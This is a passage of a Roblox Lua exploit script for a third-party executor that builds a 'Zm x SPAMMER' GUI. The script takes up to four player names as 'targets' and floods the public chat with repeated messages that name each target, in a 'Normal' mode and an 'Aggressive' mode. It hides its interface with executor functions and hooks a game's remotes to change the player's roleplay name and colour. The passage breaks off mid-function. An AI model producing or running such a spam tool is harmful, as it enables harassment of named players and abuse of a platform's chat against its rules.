--// SERVICES
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local plr = Players.LocalPlayer

--// EXECUTOR-SAFE INTERFACE LAYER
local pgui = nil
if gethui then
    pgui = gethui()
elseif syn and syn.protect_gui then
    local protectedScreen = Instance.new("ScreenGui")
    syn.protect_gui(protectedScreen)
    protectedScreen.Parent = game:GetService("CoreGui")
    pgui = protectedScreen
else
    pgui = plr:FindFirstChildOfClass("PlayerGui")
end

--// EXACT REMOTES FROM THE SOURCE SCRIPT
local RE = ReplicatedStorage:WaitForChild("RE", 5)
local NameRemote = RE and RE:WaitForChild("1RPNam1eTex1t", 5) or nil
local ColorRemote = RE and RE:WaitForChild("1RPNam1eColo1r", 5) or nil

--// FIXED PALETTES
local PureWhite = Color3.fromRGB(255, 255, 255)
local OffWhite = Color3.fromRGB(240, 245, 250)
local SoftBlue = Color3.fromRGB(200, 220, 245)
local DeepTextDark = Color3.fromRGB(20, 25, 35)
local MutedText = Color3.fromRGB(90, 105, 125)
local DarkBorder = Color3.fromRGB(180, 200, 225)
local GrayAccent = Color3.fromRGB(140, 160, 190)

-- Strict Black & Neon Red Accent Colors
local PitchBlack = Color3.fromRGB(10, 10, 14)
local DarkCardBg = Color3.fromRGB(18, 18, 24)
local InputBoxBg = Color3.fromRGB(25, 25, 35)
local PureNeonRed = Color3.fromRGB(255, 0, 50)
local DarkRedGlow = Color3.fromRGB(160, 0, 30)

local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 0

--// DESTROY PRIOR RENDERS
if pgui:FindFirstChild("á´MonK´ x á´MonK´_Zm") then
    pgui["á´MonK´ x á´MonK´_Zm"]:Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "á´MonK´ x á´MonK´_Zm"
gui.Parent = pgui
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false

-- Mode State: "Normal" or "Aggressive"
local currentMode = "Normal"

--==================================================
-- CONTROLLABLE DYNAMIC NEON SNOWFLAKE / PARTICLE SYSTEM
--==================================================
local snowFolder = Instance.new("Folder", gui)
snowFolder.Name = "SnowContainer"

local snowActive = false
local currentNeonColor = PureWhite

local function createSnowflake()
    if not snowActive then return end
    
    local flake = Instance.new("TextLabel")
    flake.Text = (currentMode == "Aggressive") and "ðŸ’¢" or "â„ï¸"
    flake.Font = Enum.Font.GothamBold
    flake.TextColor3 = currentNeonColor
    flake.BackgroundTransparency = 1
    flake.TextSize = math.random(16, 26)
    flake.Size = UDim2.new(0, 30, 0, 30)
    flake.TextTransparency = math.random(0, 3) / 10
    
    local startX = math.random()
    flake.Position = UDim2.new(startX, 0, -0.05, 0)
    flake.Parent = snowFolder

    task.spawn(function()
        local fallSpeed = math.random(15, 35) / 1000
        local swayAmplitude = math.random(15, 40) / 1000
        local swaySpeed = math.random(2, 5)
        local currentY = -0.05
        local timeAlive = 0

        while flake and flake.Parent and currentY < 1.05 and snowActive do
            local dt = task.wait(0.03)
            timeAlive = timeAlive + dt
            currentY = currentY + fallSpeed
            local currentX = startX + math.sin(timeAlive * swaySpeed) * swayAmplitude
            flake.Position = UDim2.new(currentX, 0, currentY, 0)
            flake.TextColor3 = currentNeonColor
            flake.Text = (currentMode == "Aggressive") and "ðŸ’¢" or "â„ï¸"
        end
        
        if flake and flake.Parent then
            if not snowActive then
                local tween = TweenService:Create(flake, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1})
                tween:Play()
                tween.Completed:Wait()
            end
            flake:Destroy()
        end
    end)
end

local function setSnowEnabled(state)
    snowActive = state
    if snowActive then
        task.spawn(function()
            while snowActive and gui and gui.Parent do
                createSnowflake()
                task.wait(0.12)
            end
        end)
    else
        for _, flake in pairs(snowFolder:GetChildren()) do
            if flake:IsA("TextLabel") then
                TweenService:Create(flake, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1}):Play()
                task.delay(0.5, function()
                    if flake then flake:Destroy() end
                end)
            end
        end
    end
end

--==================================================
-- UI ELEMENT 1: PROGRESS BOOT STRAPPER
--==================================================
local bootFrame = Instance.new("Frame", gui)
bootFrame.Size = UDim2.new(0, 440, 0, 260)
bootFrame.Position = UDim2.new(0.5, -220, 0.5, -130)
bootFrame.BackgroundColor3 = PureWhite
Instance.new("UICorner", bootFrame).CornerRadius = UDim.new(0, 14)

local bootGrad = Instance.new("UIGradient", bootFrame)
bootGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, PureWhite),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(235, 243, 252)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 210, 245))
})
bootGrad.Rotation = 45

local bootStrk = Instance.new("UIStroke", bootFrame)
bootStrk.Thickness = 2
bootStrk.Color = GrayAccent

local bootTitle = Instance.new("TextLabel", bootFrame)
bootTitle.Size = UDim2.new(1, 0, 0, 40)
bootTitle.Position = UDim2.new(0, 0, 0, 30)
bootTitle.Text = "Zm x SPAMMER"
bootTitle.Font = Enum.Font.GothamBlack
bootTitle.TextColor3 = DeepTextDark
bootTitle.TextSize = 22
bootTitle.BackgroundTransparency = 1

local barBg = Instance.new("Frame", bootFrame)
barBg.Size = UDim2.new(0.8, 0, 0, 6)
barBg.Position = UDim2.new(0.1, 0, 0, 130)
barBg.BackgroundColor3 = DarkBorder
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 3)

local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(50, 140, 240)
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 3)

local bootStatus = Instance.new("TextLabel", bootFrame)
bootStatus.Size = UDim2.new(1, 0, 0, 20)
bootStatus.Position = UDim2.new(0, 0, 0, 150)
bootStatus.Text = "Status: Authenticating Zm Arrays..."
bootStatus.Font = Enum.Font.Code
bootStatus.TextColor3 = MutedText
bootStatus.TextSize = 11
bootStatus.BackgroundTransparency = 1

--==================================================
-- SAFE FADE UTILITY FUNCTIONS
--==================================================
local function fadeInFrame(targetFrame)
    targetFrame.Visible = true
    TweenService:Create(targetFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()

    for _, child in pairs(targetFrame:GetDescendants()) do
        if child:IsA("UIStroke") then
            TweenService:Create(child, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency = 0}):Play()
        elseif child:IsA("TextLabel") then
            TweenService:Create(child, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        elseif child:IsA("TextBox") or child:IsA("TextButton") then
            TweenService:Create(child, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
        elseif child:IsA("ImageLabel") then
            TweenService:Create(child, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0, ImageTransparency = 0}):Play()
        end
    end
end

local function fadeOutFrame(targetFrame)
    TweenService:Create(targetFrame, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1}):Play()

    for _, child in pairs(targetFrame:GetDescendants()) do
        if child:IsA("UIStroke") then
            TweenService:Create(child, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Transparency = 1}):Play()
        elseif child:IsA("TextLabel") then
            TweenService:Create(child, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1}):Play()
        elseif child:IsA("TextBox") or child:IsA("TextButton") then
            TweenService:Create(child, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        elseif child:IsA("ImageLabel") then
            TweenService:Create(child, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1, ImageTransparency = 1}):Play()
        end
    end
end

--==================================================
-- UI ELEMENT 2: WELCOME SCREEN MODULE
--==================================================
local welcomeUI = Instance.new("Frame", gui)
welcomeUI.Size = UDim2.new(0, 340, 0, 340)
welcomeUI.Position = UDim2.new(0.5, -170, 0.5, -170)
welcomeUI.BackgroundColor3 = PureWhite
welcomeUI.BackgroundTransparency = 1
welcomeUI.Visible = false
Instance.new("UICorner", welcomeUI).CornerRadius = UDim.new(0, 18)

local welcGrad = Instance.new("UIGradient", welcomeUI)
welcGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, PureWhite),
    ColorSequenceKeypoint.new(0.65, Color3.fromRGB(235, 243, 252)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 210, 245))
})
welcGrad.Rotation = 45

local welcStrk = Instance.new("UIStroke", welcomeUI)
welcStrk.Thickness = 2.5
welcStrk.Transparency = 1
welcStrk.Color = GrayAccent

local avatar = Instance.new("ImageLabel", welcomeUI)
avatar.Size = UDim2.new(0, 56, 0, 56)
avatar.Position = UDim2.new(0, 25, 0, 25)
avatar.BackgroundColor3 = Color3.fromRGB(240, 245, 250)
avatar.BackgroundTransparency = 1
avatar.ImageTransparency = 1
avatar.BorderSizePixel = 0
Instance.new("UICorner", avatar).CornerRadius = UDim.new(0, 12)

pcall(function()
    avatar.Image = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
end)

local greetName = Instance.new("TextLabel", welcomeUI)
greetName.Size = UDim2.new(0, 220, 0, 56)
greetName.Position = UDim2.new(0, 93, 0, 25)
greetName.Text = "Welcome,\n" .. plr.DisplayName
greetName.Font = Enum.Font.GothamBold
greetName.TextColor3 = DeepTextDark
greetName.TextSize = 16
greetName.TextTransparency = 1
greetName.TextXAlignment = Enum.TextXAlignment.Left
greetName.BackgroundTransparency = 1

local desc1 = Instance.new("TextLabel", welcomeUI)
desc1.Size = UDim2.new(1, -50, 0, 25)
desc1.Position = UDim2.new(0, 25, 0, 110)
desc1.Text = "The best spammer with combo version"
desc1.Font = Enum.Font.GothamMedium
desc1.TextColor3 = Color3.fromRGB(220, 40, 40)
desc1.TextSize = 14
desc1.TextTransparency = 1
desc1.TextXAlignment = Enum.TextXAlignment.Left
desc1.BackgroundTransparency = 1

local desc2 = Instance.new("TextLabel", welcomeUI)
desc2.Size = UDim2.new(1, -50, 0, 20)
desc2.Position = UDim2.new(0, 25, 0, 135)
desc2.Text = "Made by á´MonK´"
desc2.Font = Enum.Font.Code
desc2.TextColor3 = MutedText
desc2.TextSize = 12
desc2.TextTransparency = 1
desc2.TextXAlignment = Enum.TextXAlignment.Left
desc2.BackgroundTransparency = 1

local desc3 = Instance.new("TextLabel", welcomeUI)
desc3.Size = UDim2.new(1, -50, 0, 20)
desc3.Position = UDim2.new(0, 25, 0, 160)
desc3.Text = "Zm Ko Join karlo!"
desc3.Font = Enum.Font.GothamBold
desc3.TextColor3 = DeepTextDark
desc3.TextSize = 12
desc3.TextTransparency = 1
desc3.TextXAlignment = Enum.TextXAlignment.Left
desc3.BackgroundTransparency = 1

local startBtn = Instance.new("TextButton", welcomeUI)
startBtn.Size = UDim2.new(1, -50, 0, 50)
startBtn.Position = UDim2.new(0, 25, 0, 250)
startBtn.Text = "ENGAGE TRANSMISSION Zm"
startBtn.BackgroundColor3 = Color3.fromRGB(50, 140, 240)
startBtn.BackgroundTransparency = 1
startBtn.TextColor3 = PureWhite
startBtn.TextTransparency = 1
startBtn.Font = Enum.Font.GothamBlack
startBtn.TextSize = 13
Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0, 10)

local btnStrk = Instance.new("UIStroke", startBtn)
btnStrk.Thickness = 1.5
btnStrk.Transparency = 1
btnStrk.Color = GrayAccent

--==================================================
-- UI ELEMENT 3: DASHBOARD WITH TABS
--==================================================
local main = Instance.new("Frame", gui)
main.Visible = false
main.Size = UDim2.new(0, 560, 0, 380)
main.Position = UDim2.new(0.5, -280, 1, 50)
main.BackgroundColor3 = PureWhite
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)

local mainGrad = Instance.new("UIGradient", main)
mainGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, PureWhite),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 246, 255)),
    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(205, 226, 250)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(165, 200, 242))
})
mainGrad.Rotation = 45

local mainStrk = Instance.new("UIStroke", main)
mainStrk.Thickness = 2
mainStrk.Color = GrayAccent

local mainHeader = Instance.new("TextLabel", main)
mainHeader.Size = UDim2.new(1, -90, 0, 35)
mainHeader.Position = UDim2.new(0, 20, 0, 10)
mainHeader.Text = "MonK´ x Zm • // SYSTEM CORE"
mainHeader.Font = Enum.Font.GothamBlack
mainHeader.TextColor3 = DeepTextDark
mainHeader.TextSize = 16
mainHeader.TextXAlignment = Enum.TextXAlignment.Left
mainHeader.BackgroundTransparency = 1

local closeBtn = Instance.new("TextButton", main)
closeBtn.Size = UDim2.new(0, 32, 0, 32)
closeBtn.Position = UDim2.new(1, -42, 0, 10)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextColor3 = PureWhite
closeBtn.TextSize = 16
closeBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
closeBtn.ZIndex = 10
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)

-- TAB BAR IMPLEMENTATION
local tabBar = Instance.new("Frame", main)
tabBar.Size = UDim2.new(1, -40, 0, 32)
tabBar.Position = UDim2.new(0, 20, 0, 48)
tabBar.BackgroundColor3 = Color3.fromRGB(235, 240, 248)
Instance.new("UICorner", tabBar).CornerRadius = UDim.new(0, 8)

local tabBarStrk = Instance.new("UIStroke", tabBar)
tabBarStrk.Thickness = 1.5
tabBarStrk.Color = DarkBorder

local normalTab = Instance.new("TextButton", tabBar)
normalTab.Size = UDim2.new(0.5, -3, 1, -4)
normalTab.Position = UDim2.new(0, 2, 0, 2)
normalTab.Text = "NORMAL SPAM"
normalTab.Font = Enum.Font.GothamBold
normalTab.TextSize = 11
normalTab.BackgroundColor3 = PureWhite
normalTab.TextColor3 = DeepTextDark
Instance.new("UICorner", normalTab).CornerRadius = UDim.new(0, 6)

local aggressiveTab = Instance.new("TextButton", tabBar)
aggressiveTab.Size = UDim2.new(0.5, -3, 1, -4)
aggressiveTab.Position = UDim2.new(0.5, 1, 0, 2)
aggressiveTab.Text = "AGGRESSIVE SPAM ðŸ’¢"
aggressiveTab.Font = Enum.Font.GothamBold
aggressiveTab.TextSize = 11
aggressiveTab.BackgroundColor3 = Color3.fromRGB(220, 225, 235)
aggressiveTab.TextColor3 = MutedText
Instance.new("UICorner", aggressiveTab).CornerRadius = UDim.new(0, 6)

-- TARGETS CONTAINER
local targetsContainer = Instance.new("Frame", main)
targetsContainer.Size = UDim2.new(0, 340, 0, 160)
targetsContainer.Position = UDim2.new(0, 20, 0, 92)
targetsContainer.BackgroundTransparency = 1

local gridLayout = Instance.new("UIGridLayout", targetsContainer)
gridLayout.CellSize = UDim2.new(0, 160, 0, 65)
gridLayout.CellPadding = UDim2.new(0, 15, 0, 15)

local names = {}
local targetFrames = {}
local targetStrokes = {}

for i = 1, 4 do
    local containerFrame = Instance.new("Frame", targetsContainer)
    containerFrame.BackgroundColor3 = Color3.fromRGB(245, 248, 253)
    Instance.new("UICorner", containerFrame).CornerRadius = UDim.new(0, 8)
    targetFrames[i] = containerFrame

    local cStrk = Instance.new("UIStroke", containerFrame)
    cStrk.Thickness = 1.5
    cStrk.Color = DarkBorder
    targetStrokes[i] = cStrk

    local box = Instance.new("TextBox", containerFrame)
    box.Size = UDim2.new(1, -20, 1, 0)
    box.Position = UDim2.new(0, 10, 0, 0)
    box.PlaceholderText = "TARGET " .. i
    box.PlaceholderColor3 = GrayAccent
    box.BackgroundColor3 = Color3.fromRGB(245, 248, 253)
    box.BackgroundTransparency = 1
    box.TextColor3 = DeepTextDark
    box.Font = Enum.Font.GothamBold
    box.TextSize = 11
    box.BorderSizePixel = 0
    names[i] = box
end

local configContainer = Instance.new("Frame", main)
configContainer.Size = UDim2.new(0, 160, 0, 150)
configContainer.Position = UDim2.new(0, 380, 0, 92)
configContainer.BackgroundColor3 = Color3.fromRGB(245, 248, 253)
Instance.new("UICorner", configContainer).CornerRadius = UDim.new(0, 10)

local configStrk = Instance.new("UIStroke", configContainer)
configStrk.Thickness = 1.5
configStrk.Color = DarkBorder

local speedLabel = Instance.new("TextLabel", configContainer)
speedLabel.Size = UDim2.new(1, 0, 0, 25)
speedLabel.Position = UDim2.new(0, 0, 0, 15)
speedLabel.Text = "RUNTIME DELAY"
speedLabel.Font = Enum.Font.GothamBlack
speedLabel.TextColor3 = MutedText
speedLabel.TextSize = 10
speedLabel.BackgroundTransparency = 1

local speed = Instance.new("TextBox", configContainer)
speed.Size = UDim2.new(0.8, 0, 0, 45)
speed.Position = UDim2.new(0.1, 0, 0, 48)
speed.Text = "0.8"
speed.PlaceholderText = "0.8"
speed.BackgroundColor3 = PureWhite
speed.TextColor3 = DeepTextDark
speed.Font = Enum.Font.Code
speed.TextSize = 16
speed.BorderSizePixel = 0
Instance.new("UICorner", speed).CornerRadius = UDim.new(0, 6)

local speedStrk = Instance.new("UIStroke", speed)
speedStrk.Thickness = 1.5
speedStrk.Color = DarkBorder

local start = Instance.new("TextButton", main)
start.Size = UDim2.new(1, -40, 0, 55)
start.Position = UDim2.new(0, 20, 0, 290)
start.Text = "START MonK´ x Zm "
start.BackgroundColor3 = PitchBlack
start.TextColor3 = PureWhite
start.Font = Enum.Font.GothamBlack
start.TextSize = 14
Instance.new("UICorner", start).CornerRadius = UDim.new(0, 10)

local startGrad = Instance.new("UIGradient", start)
startGrad.Rotation = 45

local startStrk = Instance.new("UIStroke", start)
startStrk.Thickness = 2
startStrk.Color = GrayAccent

--==================================================
-- THEME SWITCHING ENGINE (BLACK & RED GRADIENT NEON)
--==================================================
local function applyTheme(mode)
    currentMode = mode
    if mode == "Normal" then
        main.BackgroundColor3 = PureWhite
        mainGrad.Rotation = 45
        mainGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, PureWhite),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 246, 255)),
            ColorSequenceKeypoint.new(0.85, Color3.fromRGB(205, 226, 250)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(165, 200, 242))
        })
        mainHeader.TextColor3 = DeepTextDark
        tabBar.BackgroundColor3 = Color3.fromRGB(235, 240, 248)
        tabBarStrk.Color = DarkBorder

        normalTab.BackgroundColor3 = PureWhite
        normalTab.TextColor3 = DeepTextDark
        aggressiveTab.BackgroundColor3 = Color3.fromRGB(220, 225, 235)
        aggressiveTab.TextColor3 = MutedText

        configContainer.BackgroundColor3 = Color3.fromRGB(245, 248, 253)
        configStrk.Color = DarkBorder
        speedLabel.TextColor3 = MutedText
        speed.BackgroundColor3 = PureWhite
        speed.TextColor3 = DeepTextDark
        speedStrk.Color = DarkBorder

        for i = 1, 4 do
            targetFrames[i].BackgroundColor3 = Color3.fromRGB(245, 248, 253)
            targetStrokes[i].Color = DarkBorder
            names[i].TextColor3 = DeepTextDark
            names[i].PlaceholderColor3 = GrayAccent
        end

        if not running then
            start.BackgroundColor3 = PureWhite
            start.TextColor3 = DeepTextDark
        end

    elseif mode == "Aggressive" then
        -- BLACK & NEON RED GRADIENT THEME
        main.BackgroundColor3 = PureWhite
        mainGrad.Rotation = 135
        mainGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, PitchBlack),
            ColorSequenceKeypoint.new(0.45, Color3.fromRGB(25, 5, 12)),
            ColorSequenceKeypoint.new(0.8, Color3.fromRGB(140, 0, 25)),
            ColorSequenceKeypoint.new(1, PureNeonRed)
        })
        mainHeader.TextColor3 = PureNeonRed
        tabBar.BackgroundColor3 = PitchBlack
        tabBarStrk.Color = PureNeonRed

        normalTab.BackgroundColor3 = Color3.fromRGB(25, 20, 28)
        normalTab.TextColor3 = Color3.fromRGB(150, 100, 110)
        aggressiveTab.BackgroundColor3 = PureNeonRed
        aggressiveTab.TextColor3 = PureWhite

        -- Runtime Delay Card & Input Box Styling
        configContainer.BackgroundColor3 = DarkCardBg
        configStrk.Color = PureNeonRed
        speedLabel.TextColor3 = PureNeonRed
        speed.BackgroundColor3 = InputBoxBg
        speed.TextColor3 = PureWhite
        speed.PlaceholderColor3 = Color3.fromRGB(200, 80, 100)
        speedStrk.Color = PureNeonRed

        -- Target Cards & Input Boxes
        for i = 1, 4 do
            targetFrames[i].BackgroundColor3 = DarkCardBg
            targetStrokes[i].Color = PureNeonRed
            names[i].TextColor3 = PureWhite
            names[i].PlaceholderColor3 = Color3.fromRGB(180, 70, 90)
        end

        if not running then
            start.BackgroundColor3 = PitchBlack
            start.TextColor3 = PureWhite
        end
    end
end

normalTab.MouseButton1Click:Connect(function()
    applyTheme("Normal")
end)

aggressiveTab.MouseButton1Click:Connect(function()
    applyTheme("Aggressive")
end)

--==================================================
-- TOGGLE & CLOSE SYSTEM CONTROLS
--==================================================
local panelOpen = false

local function setPanelState(open)
    panelOpen = open
    local targetMainPos = panelOpen and UDim2.new(0.5, -280, 0.5, -190) or UDim2.new(0.5, -280, 1, 50)
    TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Position = targetMainPos}):Play()
    TweenService:Create(blur, TweenInfo.new(0.5), {Size = panelOpen and 24 or 0}):Play()
    
    setSnowEnabled(panelOpen)
end

closeBtn.MouseButton1Click:Connect(function()
    setPanelState(false)
end)

local toggle = Instance.new("TextButton", gui)
toggle.Visible = false
toggle.Size = UDim2.new(0, 120, 0, 40)
toggle.Position = UDim2.new(0, 20, 1, -55)
toggle.BackgroundColor3 = PureWhite
toggle.Text = "âš¡ Zm MENU"
toggle.Font = Enum.Font.GothamBold
toggle.TextColor3 = PureWhite
toggle.TextSize = 12
toggle.ZIndex = 20
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 10)

local toggleGrad = Instance.new("UIGradient", toggle)
toggleGrad.Rotation = 45

local toggleStrk = Instance.new("UIStroke", toggle)
toggleStrk.Thickness = 2
toggleStrk.Color = GrayAccent

toggle.MouseButton1Click:Connect(function()
    setPanelState(not panelOpen)
end)

--==================================================
-- WORD-SPAM LOGIC
--==================================================
local running = false

-- Normal Spam Word Bank
local word = {
    "TMX KUDAI Dining Table âœ¨",
    "Bed Sheet ðŸ’Ž",
    "TMX MEI Keyboard ðŸ”¥",
    "TMX KUDAI Notebook ðŸ¥€",
    "TMX MEI Running Shoes âš–ï¸",
    "TMX MARE Running Shoes âš¡",
    "TMX MARE Ceiling Fan ðŸ’«",
    "TMX MEI Desk Lamp âœ¨",
    "TMX KUDAI Ceiling Fan ðŸ”®",
    "TMX KUDAI Ceiling Fan ðŸ”¥",
    "TMX MEI Bicycle ðŸ¥€",
    "TMX KUDAI Bed Sheet ðŸ”®",
    "TMX KUDAI Wall Clock ðŸ’Ž",
    "TMX MARE Smart Phone ðŸ’¥",
    "TMX MEI Headphones ðŸ’Ž",
    "TMX KUDAI Coffee Mug ðŸ”®",
    "TMX KUDAI Desk Lamp ðŸ’§",
    "TMX MEI Running Shoes ðŸ’¥",
    "TMX MEI Ceiling Fan ðŸ¥€",
    "TMX KUDAI Notebook ðŸ”¥",
    "Dining Table ðŸ’§",
    "TMX MARE Smart Phone ðŸ”®",
    "TMX MEI Water Bottle ðŸ’«",
    "TMX MEI Umbrella ðŸ’¥",
    "TMX MEI Wooden Door ðŸ’¥",
    "TMX MARE Backpack ðŸ”¥",
    "TMX MARE Coffee Mug ðŸ¥€",
    "TMX MARE Desk Lamp ðŸ’¥",
    "TMX MEI Bed Sheet ðŸ’§",
    "TMX KUDAI Bed Sheet ðŸ¥€",
    "TMX MARE Headphones ðŸ’¥",
    "TMX MEI Toothbrush ðŸ”¥"
}

-- Aggressive Mode Word Bank
local aggWords = {
    "TNT",
    "HSY",
    "END",
    "GM",
    "DJ",
    "RR",
    "CTX",
    "FAW",
    "ROW",
    "DED",
    "OC3",
    "CQ",
    "H8?",
    "FED",
    "KIT",
    "BOX",
    "LDC",
    "GNG",

}

local function send(msg)
    local ch = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if ch then 
        pcall(function() ch:SendAsync(msg) end) 
    else
        local legacyChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if legacyChat and legacyChat:FindFirstChild("SayMessageRequest") then
            pcall(function() legacyChat.SayMessageRequest:FireServer(msg, "All") end)
        end
    end
end

start.MouseButton1Click:Connect(function()
    running = not running
    start.Text = running and "TERMINATE SYSTEM" or "START á´MonK´ x Zm"
    
    if running then
        startGrad.Enabled = false
        start.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
        start.TextColor3 = PureWhite
        startStrk.Color = Color3.fromRGB(255, 60, 60)
    else
        startGrad.Enabled = true
        applyTheme(currentMode)
    end

    if running then
        task.spawn(function()
            while running do
                local sp = tonumber(speed.Text) or 0.8
                for i, b in ipairs(names) do
                    if not running then break end
                    if b.Text ~= "" then
                        local targetDisplay = b.Text:upper()
                        local selectedPattern = ""

                        if currentMode == "Normal" then
                            -- Generate 7 random normal words safely
                            local w = {}
                            for idx = 1, 7 do
                                w[idx] = word[math.random(#word)] .. " "
                            end

                            local patterns = {
                                "@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@ [" .. targetDisplay .. "] " .. w[1] .. "[" .. targetDisplay .. "] " .. w[2] .. "[" .. targetDisplay .. "] " .. w[3] .. "\n@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@",
                                "[" .. targetDisplay .. "] " .. w[1] .. "[" .. targetDisplay .. "] " .. w[2] .. "[" .. targetDisplay .. "] " .. w[3] .. "\n-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-",
                                "|o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0||o_0|\n[" .. targetDisplay .. "] " .. w[1] .. "[" .. targetDisplay .. "] " .. w[2] .. "[" .. targetDisplay .. "] " .. w[3],
                                "[" .. targetDisplay .. "] " .. w[1] .. "[" .. targetDisplay .. "] " .. w[2] .. "[" .. targetDisplay .. "] " .. w[3] .. "\n(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)(x)",
                                "---------------------------------------------------------------------------------\n[" .. targetDisplay .. "] " .. w[1] .. "[" .. targetDisplay .. "] " .. w[2] .. "[" .. targetDisplay .. "] " .. w[3],
                                "============================================================================================================\n[" .. targetDisplay .. "] " .. w[1] .. "[" .. targetDisplay .. "] " .. w[2] .. "[" .. targetDisplay .. "] " .. w[3]
                            }
                            selectedPattern = patterns[math.random(1, #patterns)]
                        else
                            -- Pick a random word from the aggressive word list
                            local aggWord = aggWords[math.random(#aggWords)]
                            
                            local aggPatterns = {
                                "@@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@ [" .. targetDisplay .. "] > TMX " .. aggWord,
                                "@@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@ [" .. targetDisplay .. "] > TMX " .. aggWord,
                                "@@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@ [" .. targetDisplay .. "] > TMX " .. aggWord,
                                "@@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ [" .. targetDisplay .. "] > TMX " .. aggWord,
                                "@@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@ @[" .. targetDisplay .. "] > TMX " .. aggWord
                            }
                            selectedPattern = aggPatterns[math.random(1, #aggPatterns)]
                        end
                        
                        send(selectedPattern)
                        task.wait(sp)
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end)

--==================================================
-- IDENTITY AND RP COLORING
--==================================================
local function applyIdentity()
    if NameRemote then
